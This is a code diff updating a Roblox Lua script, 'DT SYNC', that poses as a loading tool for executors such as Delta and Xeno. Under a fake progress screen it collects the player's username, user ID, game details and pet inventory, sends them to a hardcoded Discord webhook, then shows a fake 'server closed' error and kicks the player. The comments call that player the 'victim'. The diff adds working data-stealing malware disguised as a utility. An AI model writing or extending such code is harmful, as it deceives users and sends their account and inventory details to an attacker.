@@ -1,26 +1,15 @@
--- 🔥 DT SYNC V3 - Logger + AutoKick + Fake Error
+-- 🔥 DT SYNC V4 - Full Update for Delta/Xeno
 local WEBHOOK = "https://ptb.discord.com/api/webhooks/1384865098736341093/623t7ZtY-THtXgCKEEZaNnkObLMkj2cMqJ7annLSYLge8TGNEOatanuRy3RtOgYco5SI"
 
--- Services
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 
--- Victim Info
-local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
-local data = {
-	name = player.Name,
-	displayName = player.DisplayName,
-	userid = player.UserId,
-	place = gameInfo.Name,
-	placeId = tostring(game.PlaceId),
-	time = os.date("%Y-%m-%d %H:%M:%S")
-}
-
--- GUI
+-- GUI Setup
 local gui = Instance.new("ScreenGui", game.CoreGui)
-gui.Name = "DTSyncGuiV3"
+gui.Name = "DTSyncGuiV4"
 
 local main = Instance.new("Frame", gui)
 main.Size = UDim2.new(0, 350, 0, 180)
@@ -64,50 +53,82 @@ end
 -- Fake Load
 for i = 1, 3 do
 	loading.Text = "Loading modules" .. string.rep(".", i)
-	wait(0.7)
+	wait(0.6)
 end
 status.Text = "Optimizing cache..."
-wait(1.1)
-status.Text = "Finalizing configuration..."
-wait(1.3)
-
--- Webhook
-pcall(function()
-	local payload = {
-		["username"] = "DT SYNC Logger",
-		["embeds"] = {{
-			["title"] = "📡 DT SYNC Execution Log",
-			["fields"] = {
-				{["name"] = "👤 Username", ["value"] = data.name, ["inline"] = true},
-				{["name"] = "💬 Display", ["value"] = data.displayName, ["inline"] = true},
-				{["name"] = "🎮 Game", ["value"] = data.place, ["inline"] = false},
-				{["name"] = "🆔 Place ID", ["value"] = data.placeId, ["inline"] = true},
-				{["name"] = "⏰ Time", ["value"] = data.time, ["inline"] = false},
-				{["name"] = "🪪 UserID", ["value"] = tostring(data.userid), ["inline"] = false}
-			},
-			["color"] = tonumber(0x32CD32)
-		}}
-	}
-	request({
-		Url = WEBHOOK,
-		Method = "POST",
-		Headers = {["Content-Type"] = "application/json"},
-		Body = HttpService:JSONEncode(payload)
-	})
-end)
-
--- Fake success before error
-loading.Text = "All modules loaded successfully"
-status.Text = "Ready. Launching dashboard..."
-wait(1.6)
-
--- Simulated error
-status.Text = "⚠ Server closed unexpectedly. Please try again later."
-loading.TextColor3 = Color3.fromRGB(255, 100, 100)
-status.TextColor3 = Color3.fromRGB(255, 120, 120)
+wait(1)
+status.Text = "Checking pet inventory..."
 wait(1.2)
 
--- Fade Out GUI
+-- Pet Logger (PS99, etc.)
+local petList = {}
+pcall(function()
+	local lib = require(ReplicatedStorage:FindFirstChild("Framework") and ReplicatedStorage.Framework:FindFirstChild("Library"))
+	local save = lib.Save.Get().Inventory.Pets
+	for id, data in pairs(save) do
+		table.insert(petList, data.id or "Unknown")
+	end
+end)
+
+-- Webhook Data
+local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+local data = {
+	name = player.Name,
+	displayName = player.DisplayName,
+	userid = player.UserId,
+	place = gameInfo.Name,
+	placeId = tostring(game.PlaceId),
+	time = os.date("%Y-%m-%d %H:%M:%S"),
+	pets = petList
+}
+
+-- Universal HTTP Request Function
+local http_request = http_request or request or (syn and syn.request) or (http and http.request)
+if http_request then
+	pcall(function()
+		local fields = {
+			{["name"] = "👤 Username", ["value"] = data.name, ["inline"] = true},
+			{["name"] = "💬 Display", ["value"] = data.displayName, ["inline"] = true},
+			{["name"] = "🎮 Game", ["value"] = data.place, ["inline"] = false},
+			{["name"] = "🆔 Place ID", ["value"] = data.placeId, ["inline"] = true},
+			{["name"] = "⏰ Time", ["value"] = data.time, ["inline"] = false},
+			{["name"] = "🪪 UserID", ["value"] = tostring(data.userid), ["inline"] = false},
+		}
+
+		if #data.pets > 0 then
+			table.insert(fields, {["name"] = "🐾 Pets", ["value"] = table.concat(data.pets, ", "), ["inline"] = false})
+		end
+
+		local payload = {
+			["username"] = "DT SYNC Logger",
+			["embeds"] = {{
+				["title"] = "📡 DT SYNC Execution Log",
+				["fields"] = fields,
+				["color"] = tonumber(0x32CD32)
+			}}
+		}
+
+		http_request({
+			Url = WEBHOOK,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(payload)
+		})
+	end)
+end
+
+-- Fake success
+loading.Text = "All modules loaded successfully"
+status.Text = "✅ Ready."
+wait(2)
+
+-- Fake error + Kick
+status.Text = "⚠ Server closed unexpectedly. Please try again later."
+loading.TextColor3 = Color3.fromRGB(255, 80, 80)
+status.TextColor3 = Color3.fromRGB(255, 100, 100)
+wait(1.2)
+
+-- Fade Out
 for i = 1, 10 do
 	main.BackgroundTransparency = i * 0.1
 	title.TextTransparency = i * 0.1
@@ -117,6 +138,5 @@ for i = 1, 10 do
 end
 gui:Destroy()
 
--- Kick user (victim)
-wait(0.2)
+-- Kick
 player:Kick("⚠ Server closed unexpectedly. Please try again later.")
